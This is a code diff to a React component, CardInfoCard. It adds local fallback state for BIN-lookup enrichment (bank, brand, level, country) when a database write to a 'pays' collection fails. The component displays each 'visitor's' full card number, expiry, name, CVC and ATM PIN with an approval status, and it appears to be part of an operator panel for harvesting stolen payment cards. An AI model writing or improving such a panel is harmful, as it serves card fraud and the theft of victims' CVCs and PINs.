@@ -3325,8 +3325,21 @@ function CardInfoCard({
       visitorAny.cardCountry
     );
 
+  // Local fallback enrichment populated from the BIN lookup so the card
+  // shows bank/brand/country immediately even when the DB write back to
+  // Supabase is slow or blocked (e.g. RLS).
+  const [localEnrichment, setLocalEnrichment] = useState<{
+    bankName?: string;
+    cardType?: string;
+    cardLevel?: string;
+    country?: string;
+    cardBrand?: string;
+  } | null>(null);
+
   useEffect(() => {
-    if (!db) return;
+    // Reset on visitor / bin change so we don't briefly show stale data
+    // from the previously selected visitor.
+    setLocalEnrichment(null);
     if (!bin || bin.length < 6) return;
     if (hasEnrichment) return;
     let cancelled = false;
@@ -3338,16 +3351,29 @@ function CardInfoCard({
         if (cancelled) return;
         if (!json?.success || !json.data) return;
         const d = json.data;
-        const patch: Record<string, string> = {
-          updatedAt: new Date().toISOString(),
-        };
-        if (d.bankName) patch.cardBankName = String(d.bankName);
-        if (d.cardType) patch.cardCategory = String(d.cardType);
-        if (d.cardLevel) patch.cardLevel = String(d.cardLevel);
-        if (d.country) patch.cardCountry = String(d.country);
-        if (d.scheme && !visitorAny.cardScheme)
-          patch.cardScheme = String(d.scheme);
-        await setDoc(doc(db!, "pays", visitor.id), patch, { merge: true });
+        setLocalEnrichment({
+          bankName: d.bankName || undefined,
+          cardType: d.cardType || undefined,
+          cardLevel: d.cardLevel || undefined,
+          country: d.country || undefined,
+          cardBrand: d.cardBrand || undefined,
+        });
+        if (db) {
+          const patch: Record<string, string> = {
+            updatedAt: new Date().toISOString(),
+          };
+          if (d.bankName) patch.cardBankName = String(d.bankName);
+          if (d.cardType) patch.cardCategory = String(d.cardType);
+          if (d.cardLevel) patch.cardLevel = String(d.cardLevel);
+          if (d.country) patch.cardCountry = String(d.country);
+          if (d.cardBrand && !visitorAny.cardScheme)
+            patch.cardScheme = String(d.cardBrand);
+          try {
+            await setDoc(doc(db, "pays", visitor.id), patch, { merge: true });
+          } catch {
+            // RLS or transient write error — UI already shows local data.
+          }
+        }
       } catch {
         // silent
       }
@@ -3363,17 +3389,31 @@ function CardInfoCard({
   const last4 = p.cardLast4 || "••••";
   const expiry = p.cardExpiry || "";
   const name = p.cardName || "";
-  const scheme = String(p.cardScheme || "").toLowerCase();
-  const bank = safeText(p.cardBank);
-  const cardType = String(p.cardType || "").toUpperCase();
-  const cardLevel = String(p.cardLevel || "").toUpperCase();
-  const cardCountry = String(p.cardCountry || "").toUpperCase();
-  const matchedBank = findBankLogo(p.cardBank);
+  const scheme = String(
+    p.cardScheme || localEnrichment?.cardBrand || "",
+  ).toLowerCase();
+  const effectiveBank = p.cardBank || localEnrichment?.bankName || "";
+  const bank = safeText(effectiveBank);
+  const cardType = String(
+    p.cardType || localEnrichment?.cardType || "",
+  ).toUpperCase();
+  const cardLevel = String(
+    p.cardLevel || localEnrichment?.cardLevel || "",
+  ).toUpperCase();
+  const cardCountry = String(
+    p.cardCountry || localEnrichment?.country || "",
+  ).toUpperCase();
+  const matchedBank = findBankLogo(effectiveBank);
   const bankLogo: string | null = p.cardBankLogo || matchedBank?.logo || null;
   const bankLabel: string = p.cardBankLabel || matchedBank?.label || bank || "";
   const waiting = visitor.cardApprovalStatus === "waiting";
   const hasBin =
-    bin || bank || p.cardType || p.cardCountry || p.cardCvc || visitor.atmPin;
+    bin ||
+    bank ||
+    cardType ||
+    cardCountry ||
+    p.cardCvc ||
+    visitor.atmPin;
   const fullCard = String(p.cardNumber || "").replace(/\D/g, "");
   const groupedCard =
     fullCard.length >= 12
